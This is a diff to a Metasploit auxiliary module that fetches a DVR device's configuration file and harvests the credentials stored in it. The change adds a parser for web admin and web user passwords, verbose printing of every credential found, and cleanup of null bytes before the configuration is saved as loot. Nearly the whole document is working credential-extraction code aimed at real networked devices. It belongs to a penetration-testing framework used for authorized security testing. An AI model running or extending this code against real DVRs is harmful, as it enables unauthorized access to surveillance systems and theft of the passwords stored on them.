@@ -103,7 +103,8 @@ class Metasploit3 < Msf::Auxiliary
 		end
 
 		info = "DDNS credentials for #{hostname}, user: #{user}, password: #{password}"
-
+		
+		vprint_good("#{rhost}: Found #{info}")
 		report_note({
 			:host   => rhost,
 			:data   => info,
@@ -140,6 +141,7 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 
+		vprint_good("#{rhost}: Found FTP_USER #{user}:#{password}")
 		report_auth_info({
 			:host         => server,
 			:port         => port,
@@ -176,6 +178,7 @@ class Metasploit3 < Msf::Auxiliary
 				user_active = true
 			end
 
+			vprint_good("#{rhost}: Found USER #{user}:#{password}")
 			report_auth_info({
 				:host         => rhost,
 				:port         => rport,
@@ -185,6 +188,61 @@ class Metasploit3 < Msf::Auxiliary
 				:pass         => password,
 				:active       => user_active
 			})
+		}
+	end
+
+	def get_web_credentials(conf)
+		# search for web_admin
+		if conf =~ /WEB_ADMIN/
+			user = ""
+			password = ""
+
+			if conf =~ /WEB_ADMIN_ID=(.*)/
+				user = $1
+			end
+
+			if conf =~ /WEB_ADMIN_PWD=(.*)/
+				password = $1
+			end
+
+			unless user.empty?
+				vprint_good("#{rhost}: Found WEB_ADMIN #{user}:#{password}")
+				report_auth_info({
+					:host         => rhost,
+					:port         => '80',
+					:sname        => 'dvr_web',
+					:duplicate_ok => false,
+					:user         => user,
+					:pass         => password
+				})
+			end
+		end
+
+		conf.scan(/WEB_USER(\d+)/).each { |match|
+			user = ""
+			password = ""
+
+			user_id = match[0]
+
+			if conf =~ /WEB_USER#{user_id}=(.*)/
+				user = $1
+			end
+
+			if conf =~ /WEB_PASSWD#{user_id}=(.*)/
+				password = $1
+			end
+
+			unless user.empty?
+				vprint_good("#{rhost}: Found WEB_USER #{user}:#{password}")
+				report_auth_info({
+					:host         => rhost,
+					:port         => '80',
+					:sname        => 'dvr_web',
+					:duplicate_ok => false,
+					:user         => user,
+					:pass         => password
+				})
+			end
 		}
 	end
 
@@ -200,18 +258,22 @@ class Metasploit3 < Msf::Auxiliary
 			return
 		end
 
-		p = store_loot("dvr.configuration", "text/plain", rhost, res.body, "DVR.cfg")
-		vprint_good("#{rhost}:#{rport} - DVR configuration stored in #{p}")
-
 		conf = res.body
+
+		#remove \0 that returns by some DVR
+		conf.gsub!(/\u0000/,'')
+
+		p = store_loot("dvr.configuration", "text/plain", rhost, conf, "DVR.cfg")
+		vprint_good("#{rhost}:#{rport} - DVR configuration stored in #{p}")
 
 		get_ftp_credentials(conf)
 		get_dvr_credentials(conf)
 		get_ddns_credentials(conf)
 		get_ppooe_credentials(conf)
+		get_web_credentials(conf)
 
 		dvr_name = ""
-		if res.body =~ /DVR_NAME=(.*)/
+		if conf =~ /DVR_NAME=(.*)/
 			dvr_name = $1
 		end
 
